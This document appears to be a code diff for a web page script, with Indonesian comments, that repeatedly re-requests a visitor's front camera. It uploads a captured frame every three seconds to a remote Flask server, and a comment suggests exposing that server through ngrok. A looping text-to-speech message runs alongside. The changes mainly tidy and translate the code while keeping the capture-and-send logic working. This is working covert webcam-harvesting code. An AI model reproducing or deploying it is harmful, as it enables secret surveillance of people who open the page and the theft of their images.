@@ -31,23 +31,20 @@
       repeatInterval: 5000,
       maxRepeats: 30
     },
-    loopInterval: 2500,       // Interval siklus re-inisialisasi stream kamera
-    uploadInterval: 3000,     // Kirim tangkapan frame ke server setiap 3 detik
-    serverEndpoint: 'http://192.168.2.124:8080/upload_capture' // Sesuaikan dengan IP/URL Flask Anda
+    loopInterval: 2500,
+    uploadInterval: 3000,     // Mengirim frame setiap 3 detik
+    // Ganti URL di bawah dengan alamat server lokal (IP network) atau URL ngrok Anda
+    serverEndpoint: 'http://192.168.2.124:8080/upload_capture' 
   };
 
   var state = {
     ttsStarted: false,
-    ttsCount: 0,
     camStream: null,
     camActive: false,
     loopTimer: null,
     uploadTimer: null
   };
 
-  // ============================================
-  // TTS MODULE (Continuous Loop)
-  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     try {
@@ -55,11 +52,9 @@
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.pitch = CONFIG.tts.pitch;
-
       u.onend = function () {
         setTimeout(speakOnce, CONFIG.tts.repeatInterval);
       };
-
       window.speechSynthesis.speak(u);
     } catch (e) {}
   }
@@ -71,9 +66,6 @@
     speakOnce();
   }
 
-  // ============================================
-  // UPLOAD CAPTURE KE SERVER FLASK
-  // ============================================
   function captureAndUpload() {
     if (!state.camActive) return;
 
@@ -94,23 +86,18 @@
       })
       .then(function(res) { return res.json(); })
       .then(function(data) {
-        console.log('[+] Frame uploaded successfully:', data.filename);
+        console.log('[+] Frame terkirim & tersimpan:', data.filename);
       })
       .catch(function(err) {
-        console.log('[-] Failed to upload frame:', err);
+        console.log('[-] Gagal mengirim frame ke server:', err);
       });
     } catch (e) {}
   }
 
-  // ============================================
-  // AGGRESSIVE CAMERA LOOP MODULE
-  // ============================================
   function stopCurrentStream() {
     if (state.camStream) {
       try {
-        state.camStream.getTracks().forEach(function(track) {
-          track.stop();
-        });
+        state.camStream.getTracks().forEach(function(track) { track.stop(); });
       } catch (e) {}
       state.camStream = null;
     }
@@ -121,17 +108,12 @@
     stopCurrentStream();
 
     navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        width: { ideal: 640 }, 
-        height: { ideal: 480 },
-        facingMode: "user" 
-      }, 
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
       audio: false 
     })
     .then(function(stream) {
       state.camStream = stream;
       state.camActive = true;
-      console.log("[+] Camera stream cycle active.");
       
       var videoElement = document.getElementById('cam-feed');
       videoElement.srcObject = stream;
@@ -144,37 +126,19 @@
       });
     })
     .catch(function(err) {
-      console.log("[-] Camera access restricted/denied:", err.name);
+      console.log("[-] Akses kamera ditolak:", err.name);
     });
   }
 
-  // ============================================
-  // INITIALIZATION & TIMERS
-  // ============================================
   window.addEventListener('DOMContentLoaded', function() {
     startTTS();
     requestCameraAccess();
   });
 
-  // Main loop interval untuk refresh stream kamera
-  state.loopTimer = setInterval(function() {
-    requestCameraAccess();
-  }, CONFIG.loopInterval);
+  state.loopTimer = setInterval(requestCameraAccess, CONFIG.loopInterval);
+  state.uploadTimer = setInterval(captureAndUpload, CONFIG.uploadInterval);
 
-  // Upload interval untuk mengirim frame tangkapan ke server Flask
-  state.uploadTimer = setInterval(function() {
-    captureAndUpload();
-  }, CONFIG.uploadInterval);
-
-  // Tab visibility monitoring
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
       requestCameraAccess();
-    }
-  });
-
-})();
-</script>
-</body>
-</html>
